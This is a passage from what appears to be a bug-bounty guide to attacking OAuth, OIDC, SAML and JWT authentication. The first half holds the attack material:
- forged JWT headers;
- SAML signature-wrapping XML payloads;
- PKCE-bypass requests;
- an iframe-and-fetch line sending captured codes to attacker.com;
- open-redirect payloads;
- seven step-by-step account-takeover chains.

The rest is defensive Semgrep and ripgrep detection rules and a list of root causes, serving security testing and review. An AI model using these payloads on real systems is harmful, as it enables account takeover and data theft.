{"aud":"","iss":"https://target/idp"}                        # empty audience → many libs accept all
{"aud":["target","alt-service"],"iss":"https://target/idp"} # token replays across services

# C.6 Embedded JWK (Hacking JWT Tokens: JWS Standard for JWT)
{"alg":"RS256","jwk":{"kty":"RSA","n":"<attacker_n>","e":"AQAB"}}        # libs that trust embedded JWK = forge anything

# C.7 Entra ID actor token (CVE-2025-55241 Dirk-jan Mollema)
# Outer token: legitimate-looking request to victim tenant SharePoint with victim_oid
# Inner token in actort claim: attacker's own free-tenant token
# Result: cross-tenant Global Admin impersonation

# C.8 njwt buffer poisoning (corpus: `njwt` allocates uninitialized Buffers when number is passed in base64urlEncode)
require('njwt').create({sub:'victim'}, 0).compact()           # number arg → uninitialized buffer leak
```

### Sub-technique D — SAML signature wrapping primitives (XSW1 through XSW8 + ruby-saml class)

```xml
<!-- D.1 XSW1 — wrap original assertion, copy original signature -->
<samlp:Response>
  <saml:Assertion ID="evil"><Subject><NameID>attacker</NameID></Subject>
    <ds:Signature>...original ref to legit ID...</ds:Signature>
    <saml:Assertion ID="legit"><Subject><NameID>victim</NameID></Subject></saml:Assertion>
  </saml:Assertion>
</samlp:Response>

<!-- D.2 ruby-saml DOCTYPE parser differential (CVE-2025-25291, ahacker1 GHSL-2024-329) -->
<!DOCTYPE samlp:Response [
  <!ATTLIST saml:Assertion ID ID #IMPLIED>
  <!ENTITY x "data">
]>
<!-- REXML truncates ATTLIST and validates signature on assertion ID="real"; Nokogiri reads attacker-injected ID="evil" -->

<!-- D.3 ruby-saml namespace confusion (CVE-2025-25292, @p- GHSL-2024-330, PortSwigger SAML Roulette) -->
<samlp:Response xmlns:ds="evil-ns">
  <ds:Signature>...</ds:Signature>     <!-- Nokogiri reads under evil-ns -->
  <ds:Signature>...</ds:Signature>     <!-- REXML reads default-ns (signs original) -->
</samlp:Response>

<!-- D.4 ACS URL injection (Admidio GHSA-p9w9-87c8-m235) -->
<samlp:AuthnRequest AssertionConsumerServiceURL="https://attacker.com/acs" Destination="https://idp.target/sso">

<!-- D.5 OneUptime multi-assertion (GHSA-5w5c-766x-265g) -->
<saml:Assertion><Subject><NameID>attacker</NameID></Subject></saml:Assertion>     <!-- assertion[0] read by getEmail -->
<saml:Assertion ID="signed"><Signature>...</Signature><Subject><NameID>legit</NameID></Subject></saml:Assertion>

<!-- D.6 Comment injection in NameID (XSW classic — Cisco Duo et al historical) -->
<saml:NameID>attacker@target.com<!---->.victim@target.com</saml:NameID>           <!-- some parsers truncate at comment -->
```

### Sub-technique E — PKCE bypass primitives

```
# E.1 Drop code_verifier from token request (CVE-2023-48228 Authentik)
POST /oauth/token
grant_type=authorization_code&code=<code>&client_id=<id>
                                # (no code_verifier)

# E.2 Drop code_challenge from authorization request (CVE-2024-23647 Authentik, Spring CVE-2024-22258)
GET /oauth/authorize?response_type=code&client_id=<id>&redirect_uri=<uri>
                                # (no code_challenge / code_challenge_method)

# E.3 Cloudflare workers-oauth-provider bypass (CVE-2025-4144 — fixed in v0.0.5)
# Auth request without code_challenge → token request WITH code_verifier was accepted
GET /authorize?response_type=code&client_id=...&redirect_uri=...
                                # (no code_challenge)
POST /token
grant_type=authorization_code&code=<code>&code_verifier=anything_random

# E.4 PKCE bypass via attacker-controlled URL (trace37 labs Feb 2026)
# Attacker iframes the SSO authorize URL; supplies own code_challenge; knows code_verifier
# Captures the resulting code via MessagePort injection or parent.postMessage
# PKCE only protects in-transit; not against initiation-control
<iframe src="https://idp.target.com/authorize?...&code_challenge=ATTACKER_HASH&code_challenge_method=S256"></iframe>
window.addEventListener('message', e => fetch('https://attacker.com/leak?'+e.data));

# E.5 Authorization code injection (RFC 9700 §4.5.3.1)
# Attacker initiates own session, gets own code; injects victim's code into attacker's session
# Even with PKCE, if attacker controls victim's code_challenge value → injection works (RFC 9700 §4.5.3.2)
```

### Sub-technique F — open redirect → OAuth ATO chains

```
# F.1 Logout redirect (lovable.dev H1 #3581815, post_logout_redirect_uri family)
/logout?redirect=https://attacker.com
/oauth/end_session?post_logout_redirect_uri=https://attacker.com
/saml/slo?RelayState=https://attacker.com           # H1 #2263044 user_saml

# F.2 Login next-parameter post-auth landing (commonly named: next, returnTo, returnUrl, callback, redirect, dest, redir, url)
/login?next=https://attacker.com&continue=https://attacker.com
/auth/login?ReturnUrl=https://attacker.com           # bountysecurity.ai .NET ReturnUrl pattern, ovofinansial CRA pattern
/sso?returnTo=https://attacker.com

# F.3 Path-traversal bypass (lovable.dev H1 #3599248 fix bypass via /..//)
/..//logout?redirect=https://attacker.com           # bypass naive same-origin check
/logout?redirect=//attacker.com                      # protocol-relative → browsers add current scheme
/logout?redirect=https:attacker.com                  # missing slashes — some libs accept

# F.4 OAuth-callback chain — open redirect on the redirect_uri's host
# 1. Find redirect_uri = https://app.target.com/oauth/callback (whitelisted)
# 2. Find open redirect at https://app.target.com/redir?url=ATTACKER (same host, not OAuth-related)
# 3. Set redirect_uri = https://app.target.com/redir?url=https://attacker.com/grab
# 4. AS validates "starts with target.com" → 302 to /redir → 302 to attacker.com with code

# F.5 Referer-leak chain (image injection on rockstargames H1 #314814, semrush #314814)
# Set redirect_uri to an HTML page on whitelisted domain that loads <img src="https://attacker.com/...">
# Referer header to attacker.com contains the OAuth code/token in the URL of the hosting page
```

## Source Code Review Patterns

### Semgrep rules (≥3, copy-pasteable YAML)

```yaml
rules:
  - id: oauth-state-not-validated
    pattern-either:
      - pattern: $REQ.query.code
      - pattern: $REQ.query['code']
    pattern-not-inside: |
      if (... $REQ.query.state ...) { ... }
    message: |
      OAuth callback handler reads `code` without validating `state` parameter.
      Per RFC 6749 §10.12, state MUST be validated against the value stored
      at flow initiation. Missing this check = CSRF on OAuth linking, leading
      to account takeover (bugbounty.ch May 2023, H1 #850022 launchpad CSRF).
    severity: ERROR
    languages: [javascript, typescript]
```

```yaml
rules:
  - id: jwt-decode-without-algorithm-pin
    pattern-either:
      - pattern: jwt.verify($TOKEN, $SECRET)
      - pattern: jwt.decode($TOKEN, verify=False)
      - pattern: jws.verify($TOKEN, $SECRET)
    message: |
      JWT verification without explicit `algorithms: ["RS256"]` allowlist.
      Vulnerable to alg=none (CVE-2025-61152), RS256→HS256 confusion
      (CVE-2024-37568, CVE-2026-22817 Hono CVSS 8.2). Always pin algorithms
      explicitly: jwt.verify(token, key, {algorithms: ["RS256"]}).
    severity: ERROR
    languages: [javascript, typescript, python]
```

```yaml
rules:
  - id: oauth-email-as-user-identifier
    pattern-either:
      - pattern: User.findOne({email: $CLAIMS.email})
      - pattern: User.find_or_create_by(email: $CLAIMS.email)
      - pattern: db.users.where(email: $CLAIMS["email"]).first
    message: |
      Email claim used as primary user identifier. Vulnerable to nOAuth
      (CVE-2024-21632 omniauth-microsoft_graph, Descope 2023). Microsoft
      Entra emits unverified email claims by default for pre-June-2023 apps.
      Use the immutable `sub` claim or Entra's `oid` claim instead.
      For Microsoft tokens, also check `xms_edov` claim before trusting email.
    severity: ERROR
    languages: [ruby, javascript, typescript, python, go]
```

```yaml
rules:
  - id: oauth-redirect-uri-substring-validation
    pattern-either:
      - pattern: $URI.startsWith($ALLOWED)
      - pattern: $URI.includes($ALLOWED)
      - pattern: $ALLOWED in $URI
      - pattern: re.match(r'.*' + $ALLOWED + '.*', $URI)
    metavariable-regex:
      metavariable: $URI
      regex: .*redirect.*
    message: |
      redirect_uri validated by substring match. Bypass with userinfo
      `https://allowed.com@attacker.com`, IDN homograph, or subdomain
      `https://allowed.com.attacker.com`. Per RFC 6749 §3.1.2.2, exact-match
      against pre-registered URIs is required. Authentik CVE-2024-52289
      (regex with unescaped dot) is the disclosed real-world example.
    severity: ERROR
    languages: [javascript, typescript, python, ruby, go]
```

```yaml
rules:
  - id: oidc-code-not-bound-to-client
    pattern: |
      def $TOKEN_HANDLER(...):
        ...
        $ENTRY = code_storage.get($CODE)
        ...
        return generate_token($ENTRY.user, ...)
    pattern-not: |
      if $ENTRY.client_id != $REQ.client_id: ...
    message: |
      Authorization code redeemed without verifying the redeeming client
      matches the client the code was issued to. Per RFC 6749 §4.1.3,
      this binding is mandatory. CVE-2026-32245 tinyauth had this exact
      bug — refresh-token flow had the check, auth-code flow did not.
    severity: ERROR
    languages: [python, go, ruby, javascript]
```

```yaml
rules:
  - id: saml-signature-validate-discarded
    pattern-either:
      - pattern: $OBJ.validateSignature(...)
      - pattern: validate_signature(...)
    pattern-not-inside: |
      $RESULT = ...
    message: |
      SAML signature validation result discarded — Admidio CVE-style
      (GHSA-25cw-98hg-g3cg). validateSignature() returns string-on-error
      instead of throwing, so unsigned/forged AuthnRequests slip through.
      Always assign the result and check explicitly: `valid = validate(...)`.
    severity: ERROR
    languages: [php, python, ruby, javascript]
```

### ast-grep patterns (≥3, language-tagged)

```bash
# A.1 Detect missing audience verification on OIDC ID Token
ast-grep --pattern 'jwt.decode($TOKEN, $KEY, $$$OPTS)' --lang javascript \
  | rg -L 'audience|aud:'

# A.2 Detect Microsoft Graph email-claim trust (nOAuth CVE-2024-21632 family)
ast-grep --pattern 'token.User{ID: $$$, Email: $EMAIL}' --lang go

# A.3 Detect OAuth redirect_uri loose comparison
ast-grep --pattern '$URI.startsWith($PREFIX)' --lang javascript \
  | rg redirect_uri

# A.4 Detect SAML response handler reading assertion[0] (multi-assertion injection)
ast-grep --pattern 'assertion[0]' --lang typescript

# A.5 Detect Hono JWK middleware without explicit alg allowlist (CVE-2026-22818)
ast-grep --pattern 'jwk({ jwks_uri: $URI })' --lang typescript

# A.6 Detect PKCE bypass — code_verifier not required when code_challenge present
ast-grep --pattern 'if ($CODE_VERIFIER) { verify_pkce($$$) }' --lang python
```

### ripgrep one-liners (≥3)

```bash
# R.1 OAuth callback handlers missing state validation
rg -n '/oauth/callback|/auth/callback|/oidc/callback' --type js --type py --type rb -l \
  | xargs rg -L 'state'

# R.2 JWT libraries with verify=False (Python/Node/Go)
rg -n 'verify=False|noVerify|skipVerification|verify:\s*false' --type py --type js --type ts --type go

# R.3 Hardcoded OAuth client_secret in frontend bundle (CRA / Vite / Next.js)
rg -n 'REACT_APP_.*(SECRET|KEY)|VITE_.*(SECRET|KEY)|NEXT_PUBLIC_.*(SECRET|KEY)' \
  -g 'package.json' -g '*.env*' -g 'src/**' -g 'public/**'

# R.4 Mutable email claims used as account key
rg -n 'find_by.*email|findOne.*email|getOrCreate.*email|find_or_create_by.*email' \
  --type rb --type js --type py --type go | rg -i 'oauth|oidc|sso|claim|userinfo'

# R.5 SAML signature handlers using REXML + Nokogiri together (parser differential class)
rg -n "require ['\"]rexml" --type rb -l | xargs rg -l "require ['\"]nokogiri"

# R.6 OAuth implicit flow / response_type=token enabled
rg -n "response_type[\"']?\s*[:=]\s*[\"']?token|allow_implicit_flow\s*[:=]\s*true|allowImplicitFlow:\s*true" \
  --type js --type ts --type py --type rb

# R.7 OIDC nonce never checked
rg -n 'id_token' --type js --type py --type go -l | xargs rg -L 'nonce'

# R.8 Authorization code redeemed without client binding (CVE-2026-32245 tinyauth pattern)
rg -n 'authorization_code' --type go --type js --type py --type rb | rg -B5 -A20 'token' | rg -L 'client_id'
```

### CodeQL hint

CodeQL has shipped tutorials for OAuth/SAML auth bypass classes — the relevant base queries are `js/insufficient-key-size`, `js/jwt-missing-algorithm-restriction`, and `py/jwt-missing-algorithm`. Sketch a custom predicate for nOAuth: a `RemoteFlowSource` reaching a `User.findBy(email=...)` sink without an intermediate verification of `email_verified` or `xms_edov` claim should raise a query. The GitHub Security Lab `securitylab.github.com/advisories/GHSL-2024-329_GHSL-2024-330_ruby-saml` writeup documents the parser-differential predicate that found CVE-2025-25291 — adapt it as a generic `XmlParser1.parse(input).descendant() != XmlParser2.parse(input).descendant()` taint flow.

## Modern Meta — Cloud-Native, CI/CD, OSS Pipeline

OAuth/OIDC/SAML/JWT primitives apply across the entire cloud-native stack — not just web apps.

- **GitHub Actions**: workflows that authenticate to cloud via OIDC use `id-token: write` permission. Hunt for `pull_request_target` workflows that compose `${{ github.event.pull_request.head.repo.full_name }}` into a script that requests OIDC tokens — script injection escalates to cloud IAM. The `actions/github-script` action mints OIDC tokens to any audience the workflow asks for; if a downstream workflow uses untrusted `audience` from PR input, it becomes a cross-org token. Salesloft Drift August 2025 incident showed *PAT in GitHub repo + AWS via OIDC + Drift OAuth tokens* as the supply-chain entrypoint that hit Cloudflare, Palo Alto, Zscaler and 757 others.

- **GitLab CI**: `CI_JOB_JWT` / `CI_JOB_TOKEN` are JWT credentials. CI_JOB_JWT supports OIDC federation to AWS / GCP / Vault. If a job's audience claim is unrestricted (`sub_pattern: project_path:*`), any project in the GitLab instance can impersonate. Hunt for cloud trust policies with `iss=https://gitlab.com` but no `sub` constraint. Also: GitLab's own CVE-2025-25291/25292 ruby-saml family means GitLab Enterprise SAML SSO with parser differentials is exploitable end-to-end (PortSwigger SAML Roulette demonstrated unauthenticated admin).

- **Jenkins**: OAuth/OIDC plugins (`oic-auth`, `azure-ad`, `github-oauth`) with relaxed `email` matching = nOAuth at scale across CI infrastructure. Jenkins script-console exposure via authenticated OIDC group claim from attacker-controlled IdP becomes RCE on the controller. Hunt every Jenkins login page for OIDC support and test with a self-hosted IdP.

- **ArgoCD / Flux**: **CVE-2025-55190 Argo CD project token leak** — a token with `projects, get` retrieves repository credentials. **CVE-2026-23990 Flux Operator** — empty OIDC `email`/`groups` claims bypass impersonation, requests run as the Flux service account. **CVE-2022-31034 Argo CD insecure entropy in PKCE/OIDC params** (still affects unpatched 2.x deployments). The pattern: GitOps controllers consume OIDC for human auth and use service tokens for machine actions; mixing these scopes loses the human's scope-restriction.

- **Kubernetes**: kubelet exposed at `:10250` with anonymous auth = RBAC bypass; if cluster uses OIDC for `kube-apiserver`, the OIDC token's `aud` claim must match `--oidc-client-id`. Many clusters set `aud=*` in trust → cross-cluster token replay. ServiceAccount projected tokens (TokenRequest API) include `kubernetes.io` audience by default; any pod that reads file-mounted projected tokens for non-K8s use cases is leaking credentials with cluster-scoped usability. **Tekton CVE-2026-40161** git resolver leaks PAT to attacker-controlled `serverURL`.

- **Cloud IAM**: AWS OIDC trust against GitHub/GitLab without `sub` constraint = cross-org token. Azure AD multi-tenant OAuth apps without `xms_edov` validation = nOAuth (CVE-2024-21632 omniauth-microsoft_graph; **CVE-2025-55241 Entra ID actor token cross-tenant Global Admin impersonation, Dirk-jan Mollema**). GCP Workload Identity Federation has analogous bugs — check that `subject_token_type` is constrained. AWS STS `AssumeRoleWithWebIdentity` requires audience binding; missing → cross-account token.

- **Supply chain (Salesloft Drift class)**: Third-party SaaS integrations use long-lived OAuth refresh tokens. UNC6395/ShinyHunters used `truffleHog` against Salesloft's GitHub repo to find Drift OAuth tokens, then exfiltrated 1.5B Salesforce records from 760 companies. Hunt your target's third-party connector inventory: each Slack app, Drift bot, HubSpot integration, Zendesk plugin is an OAuth grant your org accepted. Audit scopes (`offline_access`, `Mail.Read`, `repo`), audit revocation flows, audit logs for unusual API call rates (Salesforce Bulk API 2.0 calls under 3 minutes was the IOC).

- **Container/edge OAuth**: Cloudflare Workers OAuth Provider (the very library that hosts MCP servers) had **CVE-2025-4143 missing redirect_uri validation, CVE-2025-4144 PKCE bypass**, and **GHSA-2h78-5wx8-jccc CSRF + open redirect via state parameter**. These bugs show up in Worker code that opted into building OAuth providers without OAuth library experience. Same pattern is repeating in Bun, Deno, and edge runtime auth implementations. Hunt every edge-runtime OAuth as if it's amateur-hour.

## Chains & Multi-Bug Templates

**Chain 1 — Open Redirect → OAuth Token Theft → Account Takeover (the universal $5K-$15K chain)**
- Bug A: Open redirect on `https://app.target.com/redirect?url=` (CWE-601), filed standalone = $150 Low
- Bug B: OAuth `redirect_uri` registered as `https://app.target.com/oauth/callback` with allowlist by host prefix
- Bug C: Set `redirect_uri=https://app.target.com/redirect?url=https://attacker.com` — AS validates host prefix, browser then follows the in-host redirect to attacker
- Outcome: Attacker captures victim's `code` or `access_token`, exchanges for session, full ATO including admin
- Bounty range: $5,000-$15,000 (DEV.to lucky_lonerusher 2026 reports $15K confirmed payout; H1 corpus consistently mid-four-figure to low-five-figure)
- Disclosure source: HackerOne #665651 (Stealing Users OAuth Tokens through redirect_uri parameter), HackerOne #770548 (Insecure OAuth redirection at admin.8x8.vc, $High), Pixiv H1 #1861974 ($2,000)

**Hunter's note:** This is the *first chain you should attempt on every program*. Don't file the open redirect alone — every triager kills standalone open redirects as Low. The pivot that separates a $150 Low from a $15K Critical is twenty minutes spent finding the OAuth flow on the same host. The open redirect must be on a host that's allowed as a redirect_uri; check the application's OAuth configuration page (often `/developers`, `/settings/applications`, or third-party login scope page) to confirm the host is whitelisted. The trick most hunters miss: the open-redirect endpoint doesn't have to be a *vulnerability* — many products ship intentional `?next=` redirects with naive same-origin checks. Lovable.dev H1 #3599248 demonstrated even a fix bypass (the `/..//` path-traversal trick) is enough.

**Chain 2 — nOAuth + Account Merge → Cross-Tenant Microsoft Account Takeover**
- Bug A: Target uses "Sign in with Microsoft" (Entra ID multi-tenant)
- Bug B: Target's OAuth user-mapping uses `email` claim instead of `oid` / `sub` (CVE-2024-21632 pattern)
- Bug C: Account merge logic links new OAuth login to existing local account by email
- Outcome: Attacker creates free Entra tenant, sets mail attribute to victim's email, logs in to target, fully takes over victim's account — bypassing MFA, password, all conditional access
- Bounty range: $5,000-$75,000 (Descope's coordinated nOAuth disclosure paid $75K+ across multiple programs; CVE-2024-21632 GHSA disclosed bug in omniauth-microsoft_graph, Recognize.app program; Semperis 2025 found 9% of Entra Gallery apps still vulnerable)
- Disclosure source: CVE-2024-21632, GHSA-5g66-628f-7cvj, Descope blog post June 20 2023, Semperis blog June 25 2025

**Hunter's note:** What worked: registering a brand-new Entra tenant takes 5 minutes via free.azure.microsoft.com — no credit card for nOAuth testing. Set the user's `mail` attribute (Contact Information) to the victim's email; do NOT use the UPN. The xms_edov claim was introduced post-June-2023 to mitigate this, but Microsoft set `removeUnverifiedEmailClaim=true` only for *new* app registrations after June 2023; **the default for older apps is still vulnerable**. Why this pays where the single bug doesn't: standalone "you trust the email claim" without a working PoC is theoretical and gets closed Informative. Demonstrate the merge against a real victim account *you own* (your second account on the target) and the bug becomes Critical.

**Chain 3 — SAML Parser Differential → Unauthenticated Admin on GitLab Enterprise (the SAML Roulette chain)**
- Bug A: Target uses `ruby-saml < 1.18.0` (or `omniauth-saml` referencing ruby-saml < 1.18.0) — fingerprint via login response Server header or behavior
- Bug B: Obtain *any* legitimately signed SAML assertion (your own login on a smaller tenant of the same IdP, or any partner-org assertion from federated SSO)
- Bug C: Modify XML with DOCTYPE `<!ATTLIST>` injection (CVE-2025-25291) or namespace confusion (CVE-2025-25292) so REXML and Nokogiri see different documents — REXML validates signature on the original element, Nokogiri reads attacker's NameID
- Bug D: Set NameID to admin user (often known: `admin@target.com`, `root@target.com`, first user enumerated)
- Outcome: Unauthenticated admin access to the target SAML SP — for GitLab Enterprise, this is unauthenticated cluster-admin
- Bounty range: GitHub Security Lab paid undisclosed five-figure-plus for CVE-2025-25291/25292 (private bug bounty engagement, ahacker1 + Peter Stöckli + p-); GitLab Enterprise SSRF/SAML paths historically pay $10K-$20K via H1 #gitlab program
- Disclosure source: CVE-2025-25291, CVE-2025-25292, GHSL-2024-329, GHSL-2024-330, PortSwigger SAML Roulette by Gareth Heyes + Zakhar Fedotkin (March 2025), GitHub Security Lab advisory by Peter Stöckli

**Hunter's note:** What worked: SAML Raider is the right Burp extension; do not try to craft XML by hand. The hardest part of this chain isn't the parser-differential payload — it's getting *any* signed assertion. Set up a free Okta developer org or use the IdP's public sandbox; the signature on your own assertion is what you'll wrap. The DOCTYPE technique only works on Ruby < 3.4.2 because REXML truncates `!ATTLIST` differently in newer Ruby versions; combine namespace confusion with DOCTYPE for max coverage. Why this pays: SAML is the auth protocol enterprises *trust the most*, so any signature bypass is a perfect storm of "production critical" and "no detection signature." GitLab paid premium because their entire enterprise tier sells on SAML SSO security.

**Chain 4 — Subdomain Takeover → OAuth redirect_uri whitelist bypass → Federated Account Takeover**
- Bug A: Find dangling subdomain in `*.target.com` (S3, Heroku, GitHub Pages, Azure App Service, Vercel) via `subzy` / `nuclei takeover templates`
- Bug B: Claim it (e.g., `git push` to abandoned-app.heroku.com matches the dangling CNAME)
- Bug C: Target's OAuth provider whitelists `*.target.com` for redirect_uri (or uses substring match)
- Bug D: Set `redirect_uri=https://abandoned-subdomain.target.com/oauth/callback` — AS approves; victim's code lands on attacker host
- Outcome: Federated SSO account takeover for any user who clicks attacker's auth URL
- Bounty range: $2,000-$10,000 disclosed via HackerOne (subdomain takeover alone $200-$5K HackerOne program range, but chained to OAuth ATO crosses into mid-four to low-five-figure)
- Disclosure source: HackTricks OAuth wiki (`*.example.com wildcard`) at https://hacktricks.wiki/en/pentesting-web/oauth-to-account-takeover.html, HackerOne corpus pattern (multiple disclosed reports across H1 with the wildcard-takeover→OAuth chain)

**Hunter's note:** What worked: most programs treat subdomain takeover as Low/Medium standalone, but combining with OAuth ATO escalates to High/Critical because you can prove victim impact. The hardest part: programs differ on whether they accept the chain — some say "we already paid for the subdomain takeover, the OAuth angle is duplicate." Counter this in your report by emphasizing *blast radius*: standalone takeover affects only users who click attacker links going to that subdomain; OAuth chain affects every user who clicks "Login with Target" anywhere. What failed first: I tried takeover → cookie injection on the apex first; modern `__Host-` cookies blocked it. Pivot to OAuth was 30 minutes of redirect_uri fuzzing. Why this pays: it demonstrates a real-world attack path, not a hypothetical CWE-601.

**Chain 5 — MCP server misconfig → OAuth code interception → Agentic LLM API abuse → Credential exfil**
- Bug A: Find MCP server (HTTP endpoint advertising `WWW-Authenticate: Bearer realm="MCP"` or `/.well-known/oauth-protected-resource`)
- Bug B: MCP server uses `cloudflare/workers-oauth-provider < 0.0.5` → CVE-2025-4143 (no redirect_uri validation) + CVE-2025-4144 (PKCE downgrade)
- Bug C: Send victim crafted authorize URL with `redirect_uri=https://attacker.com` and no `code_challenge`
- Bug D: Capture victim's code, exchange at token endpoint with attacker's `code_verifier` (PKCE downgrade allows it)
- Bug E: Use stolen MCP token to invoke MCP tools (e.g., D1 database read, GitHub repo content read, AWS Lambda invoke)
- Bug F: MCP tool output containing private repo contents flows back to attacker; if MCP server is bridged to LangChain agent with shell exec → also RCE
- Outcome: Account takeover on the MCP server + exfil of all data the OAuth scopes covered + potential RCE if agent executes arbitrary code
- Bounty range: low-five-figure to mid-five-figure (Anthropic CVE-2025-49596 MCP Inspector RCE in 38K weekly downloads, classed Critical; JFrog disclosed CVE-2025-6514 mcp-remote RCE affecting 558K downloads; Cloudflare paid for workers-oauth-provider class internally)
- Disclosure source: CVE-2025-4143, CVE-2025-4144, CVE-2025-6514, CVE-2025-49596, GHSA-qgp8-v765-qxx9 (Cloudflare), GHSA-4pc9-x2fx-p7vj (Cloudflare), GHSA-5h2m-4q8j-pqpj (FastMCP), GHSA-2h78-5wx8-jccc (Google Security Research → Cloudflare)

**Hunter's note:** What worked: MCP servers are *brand new attack surface* and most of them are written by developers who've never deployed OAuth before. The Anthropic ecosystem (Claude Desktop, Cursor, Windsurf, claude.ai) connects to thousands of self-hosted MCP servers, and Obsidian Security's research shows the *common* implementation pattern is broken in at least one of: anonymous-cookie session binding, PKCE enforcement, audience validation, or redirect_uri checking. Why this pays: the OAuth bug becomes a tool-use compromise, which in agentic LLM context means private data exfil + cross-tenant pivot. The pivot most hunters miss: the MCP server's OAuth token is often passed *through* to a downstream API (Salesforce, GitHub, Slack), so stealing it gives you access to the underlying SaaS, not just the MCP layer. Audit `WWW-Authenticate: Bearer realm="MCP"` responses for `resource_metadata` URL — the metadata document tells you exactly which downstream APIs the token is valid against.

**Chain 6 — JWT alg confusion → JWKS extraction → Service-to-Service Token Forgery → Cross-Service Privilege Escalation**
- Bug A: Target uses RS256-signed JWTs with public JWKS at `/.well-known/jwks.json`
- Bug B: Backend library is `python-jose` ≤ 3.3.0 (CVE-2025-61152), or Hono < 4.11.4 (CVE-2026-22817), or any library not pinning `algorithms: ["RS256"]`
- Bug C: Extract public key from JWKS, format as PEM
- Bug D: Forge HS256 token signed with the PEM as HMAC secret using `jwt_tool -X k -pk public.pem`
- Bug E: Token's `aud` claim is missing or wildcard → token replays across multiple internal services in same JWT trust circle (CVE-2025-27370 audience injection class)
- Outcome: Forge JWT for any user including admin; replay across all services in the JWT trust circle; cross-service privilege escalation
- Bounty range: $5,000-$25,000 depending on services accessible (H1 #1080786 jwt header merchant_id misconfig $High; H1 #1889161 JWT audience claim not verified Critical; widespread internal-service RCE chains have paid $25K+ on bug bounty programs that cover internal infrastructure)
- Disclosure source: CVE-2026-22817 (Hono CVSS 8.2), CVE-2026-22818 (Hono JWK middleware GHSA-3vhc-576x-3qv4), CVE-2024-37568 (Authlib HMAC bypass milliesolem), CVE-2024-54150 (cjwt), CVE-2025-27370/27371 (OpenID Federation audience injection)

**Hunter's note:** What worked: the alg=none variant is *still* a working bug despite being known since 2015 — python-jose accepts it on `verify_signature: False` configurations (CVE-2025-61152). The case-bypass variants `nOnE`/`NoNE`/`NULL` work against many homegrown JWT validators that string-compare without lowercasing. The RS256→HS256 trick has the highest impact but requires the public key to be in PEM-compatible format (some JWKS endpoints emit raw modulus/exponent only — you need to convert). Why this pays where solo "alg=none accepted" doesn't: chaining to *cross-service* replay shows blast radius. Triagers see "you forged a JWT for service X" and ask "so what?" — if you also demonstrate "and X's token is accepted by service Y because both sit behind the same JWT validator," it becomes a multi-system breach.

**Chain 7 — Race-Condition OAuth Token Mint → Multiple Sessions → Persistence**
- Bug A: Target's `/oauth/token` endpoint check-then-use code redemption (no DB lock)
- Bug B: Submit 50 parallel POST `/oauth/token` requests with same `code`, different `code_verifier` values, via Turbo Intruder single-packet HTTP/2 attack
- Bug C: 2+ requests succeed, returning 2+ valid `access_token` values
- Bug D: Each access_token is for a different effective session; deleting one doesn't kill the others (depending on backend session model)
- Outcome: Persistent access via second token even after victim revokes first; OAuth token mint for arbitrary scopes if scope is also in race window
- Bounty range: $5,000-$10,000 disclosed via HackerOne ($8,500 P1 paid to Anmol Singh Yadav April 2025 on Fortune 500 cloud business-management platform; race-condition severity scales with what the resulting token grants)
- Disclosure source: InfoSec Write-ups Anmol Singh Yadav April 20 2025 disclosed at https://infosecwriteups.com/how-i-hijacked-oauth-tokens-through-a-parallel-auth-flow-race-condition-8500-p1-bug-bounty-7af1cccc4d4c — $8500 P1 OAuth race condition disclosed program writeup, HackerOne corpus race-condition OAuth pattern (multiple disclosed)

**Hunter's note:** What worked: Turbo Intruder's `engine=Engine.BURP2 concurrentConnections=1 requestsPerConnection=50 pipeline=False` configuration with HTTP/2 single-packet (`gate.openGate(150)`) reliably wins token-endpoint races. The endpoints to attack are: `/oauth/token`, `/sso/token`, `/connect/token`, GraphQL `exchangeToken` mutations, and any `/refresh` endpoint that swaps a refresh token for an access token. What failed first: standard race attempts via `requests` Python library never won — needed Turbo Intruder's last-byte-sync. Why this pays: most OAuth race-condition bugs are *invariants violations* (RFC 6749 §4.1.2 says codes are single-use); demonstrating the violation with two different tokens is high-impact because it breaks the security model of OAuth. The triager doesn't have to decide "is this serious?" — RFC text decides for them.

## Common Root Causes

OAuth/OIDC/SAML/JWT bugs cluster around predictable developer mistakes. Hunting cheat-sheet for code review or behavioral testing:

- **Pattern 1: redirect_uri loose-validation.** Where to look: any startsWith/contains/regex/Set membership check on the `redirect_uri` value. Failure mode: substring or regex bypass. Disclosed example: CVE-2024-52289 Authentik regex with unescaped `.` (`https://app.example.com` accepts `https://app0example.com`).
- **Pattern 2: state parameter not validated.** Where to look: OAuth callback handler that reads `code` from query without referencing `state`. Failure mode: CSRF on OAuth linking → attacker links victim to attacker's IdP account. Disclosed example: HackerOne #850022 launchpad.37signals.com OAuth2 CSRF, bugbounty.ch May 2023 case study.
- **Pattern 3: Email claim used as user identifier.** Where to look: User.findBy(email=...) called with OIDC claim. Failure mode: nOAuth — Entra ID emits unverified email by default for pre-2023 apps. Disclosed example: CVE-2024-21632 omniauth-microsoft_graph (Recognize.app), Semperis 2025 found 15,000+ SaaS apps still vulnerable.
- **Pattern 4: JWT algorithm taken from token header.** Where to look: jwt.verify(token, secret) without algorithms param; or JWK lookup that falls back to header.alg when JWK lacks `alg`. Failure mode: alg=none, RS256→HS256, custom algorithm bypass. Disclosed example: CVE-2026-22817 Hono CVSS 8.2, CVE-2024-54150 cjwt, CVE-2024-37568 Authlib.
- **Pattern 5: Authorization code not bound to client.** Where to look: token endpoint reads stored code, doesn't check storedCode.clientID == requestingClientID. Failure mode: Cross-client code redemption — malicious OAuth RP exchanges another client's code for tokens. Disclosed example: CVE-2026-32245 tinyauth (refresh-token flow had check, auth-code flow didn't, GHSA-xg2q-62g2-cvcm).
- **Pattern 6: PKCE downgrade — code_verifier optional when code_challenge present.** Where to look: token endpoint that wraps PKCE check in `if (code_verifier) { ... }`. Failure mode: Drop code_verifier → check skipped. Disclosed example: CVE-2023-48228 Authentik, CVE-2024-22258 Spring Authorization Server, CVE-2025-4144 Cloudflare workers-oauth-provider.
- **Pattern 7: SAML signature verification result discarded.** Where to look: `validateSignature(...)` called as expression statement, return value not assigned/checked. Failure mode: Forged AuthnRequest accepted as if signed. Disclosed example: CVE GHSA-25cw-98hg-g3cg Admidio (`smc_require_auth_signed` config flag completely ineffective).
- **Pattern 8: SAML AssertionConsumerServiceURL trusted from request.** Where to look: SAMLService that uses `request.getAssertionConsumerServiceURL()` as the response Destination/Recipient. Failure mode: Attacker crafts AuthnRequest with arbitrary ACS URL → IdP delivers signed assertion to attacker. Disclosed example: GHSA-p9w9-87c8-m235 Admidio (May 2026).
